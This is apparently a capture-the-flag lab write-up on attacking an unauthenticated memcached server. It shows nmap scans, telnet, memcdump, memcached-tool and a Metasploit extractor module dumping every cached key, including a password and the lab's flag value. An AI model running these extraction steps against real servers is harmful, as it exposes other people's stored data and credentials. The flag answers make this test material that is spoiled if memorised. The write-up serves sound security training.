#### 1. Basics

###### Attacker Info

```sh
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.1.3  netmask 255.255.255.0  broadcast 10.1.1.255
        ether 02:42:0a:01:01:03  txqueuelen 0  (Ethernet)
        RX packets 371  bytes 29916 (29.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 284  bytes 662115 (646.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.126.117.2  netmask 255.255.255.0  broadcast 192.126.117.255
        ether 02:42:c0:7e:75:02  txqueuelen 0  (Ethernet)
        RX packets 65574  bytes 3541732 (3.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 65548  bytes 3801811 (3.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 42  bytes 3633 (3.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 42  bytes 3633 (3.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@attackdefense:~#
```

----

###### Recon

* Find the version of memcached server using nmap.

```sh
root@attackdefense:~# nmap -sV -n -p- 192.126.117.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-07 15:22 UTC
Nmap scan report for 192.126.117.3
Host is up (0.000011s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE   VERSION
11211/tcp open  memcached Memcached 1.5.12 (uptime 1592 seconds)
MAC Address: 02:42:C0:7E:75:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
root@attackdefense:~#
```

Version of memcached server &rarr; `1.5.12`

----

* Find the version information using netcat or telnet.

```sh
root@attackdefense:~# telnet 192.126.117.3 11211
Trying 192.126.117.3...
Connected to 192.126.117.3.
Escape character is '^]'.
version
VERSION 1.5.12
quit
Connection closed by foreign host.
root@attackdefense:~#
```

Version &rarr; `1.5.12`

---

* Find the maximum number of simultaneous incoming connections allowed by the memcached server use available nmap scripts.

```sh
root@attackdefense:~# nmap -p 11211 --script memcached-info 192.126.117.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-07 15:24 UTC
Nmap scan report for nsn3csa95r0kqe6askqwq89gx.temp-network_a-126-117 (192.126.117.3)
Host is up (0.000051s latency).

PORT      STATE SERVICE
11211/tcp open  memcache
| memcached-info:
|   Process ID: 8
|   Uptime: 1698 seconds
|   Server time: 2019-04-07T15:24:04
|   Architecture: 64 bit
|   Used CPU (user): 0.159205
|   Used CPU (system): 0.084577
|   Current connections: 2
|   Total connections: 6
|   Maximum connections: 2147
|   TCP Port: 11211
|   UDP Port: 0
|_  Authentication: no
MAC Address: 02:42:C0:7E:75:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
root@attackdefense:~#
```

Maximum number of simultaneous incoming connections allowed by the memcached server &rarr; `2147`

----

* Find the number of current items on the memcached server using memcstat.

```sh
root@attackdefense:~# memcstat --servers=192.126.117.3 | grep curr_items:
         curr_items: 10
root@attackdefense:~#
```

Current items on the memcached server &rarr; `10`

----

* Find the value stored in key “flag” from the key value pairs dumped by available metasploit module.

```sh
root@attackdefense:~# msfconsole
 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v5.0.0-dev-64c629e75a                ]
+ -- --=[ 1837 exploits - 1038 auxiliary - 319 post       ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]
+ -- --=[ ** This is Metasploit 5 development branch **   ]

msf5 > search memcache

Matching Modules
================

   Name                                               Disclosure Date  Rank    Check  Description
   ----                                               ---------------  ----    -----  -----------
   auxiliary/dos/misc/memcached                                        normal  No     Memcached Remote Denial of Service
   auxiliary/gather/memcached_extractor                                normal  Yes    Memcached Extractor
   auxiliary/scanner/memcached/memcached_amp          2018-02-27       normal  Yes    Memcached Stats Amplification Scanner
   auxiliary/scanner/memcached/memcached_udp_version  2003-07-23       normal  Yes    Memcached UDP Version Scanner


msf5 > use auxiliary/gather/memcached_extractor
msf5 auxiliary(gather/memcached_extractor) > show options

Module options (auxiliary/gather/memcached_extractor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    11211            yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf5 auxiliary(gather/memcached_extractor) > set RHOSTS 192.126.117.3
RHOSTS => 192.126.117.3
msf5 auxiliary(gather/memcached_extractor) > run

[+] 192.126.117.3:11211   - Found 10 keys

Keys/Values Found for 192.126.117.3:11211
=========================================

 Key         Value
 ---         -----
 address     "VALUE address 0 14\r\n8188 Yukon St.\r\nEND\r\n"
 city        "VALUE city 0 10\r\nMount Airy\r\nEND\r\n"
 country     "VALUE country 0 13\r\nUnited States\r\nEND\r\n"
 first_name  "VALUE first_name 0 5\r\nJimmy\r\nEND\r\n"
 flag        "VALUE flag 0 32\r\n25c8dc1c75c9965dff9afd3c8ced2775\r\nEND\r\n"
 last_name   "VALUE last_name 0 5\r\nFrank\r\nEND\r\n"
 nick_name   "VALUE nick_name 0 3\r\nJim\r\nEND\r\n"
 password    "VALUE password 0 7\r\npass123\r\nEND\r\n"
 state       "VALUE state 0 8\r\nMaryland\r\nEND\r\n"
 zip         "VALUE zip 0 5\r\n21771\r\nEND\r\n"

[+] 192.126.117.3:11211   - memcached loot stored at /root/.msf4/loot/20190407152840_default_192.126.117.3_memcached.dump_232784.txt
[*] 192.126.117.3:11211   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(gather/memcached_extractor) >
```

Value stored in key `"flag"` &rarr; `25c8dc1c75c9965dff9afd3c8ced2775`

----

* Find the name of all keys present on the memcached server using memcdump.

```sh
root@attackdefense:~# memcdump --servers=192.126.117.3
flag
password
country
zip
state
city
address
nick_name
last_name
first_name
root@attackdefense:~#
```

Keys &rarr; `flag, password, country, zip, state, city, address, nick_name, last_name, first_name`

----

* Find the value stored in key “first_name” using memcached-tool.

```sh
root@attackdefense:~# /usr/share/memcached/scripts/memcached-tool 192.126.117.3:11211 dump
Dumping memcache contents
  Number of buckets: 1
  Number of items  : 10
Dumping bucket 1 - 10 total items
add nick_name 0 0 3
Jim
add password 0 0 7
pass123
add first_name 0 0 5
Jimmy
add flag 0 0 32
25c8dc1c75c9965dff9afd3c8ced2775
add last_name 0 0 5
Frank
add country 0 0 13
United States
root@attackdefense:~#
```

Value stored in key `“first_name”` &rarr; `Jimmy`

----

EOF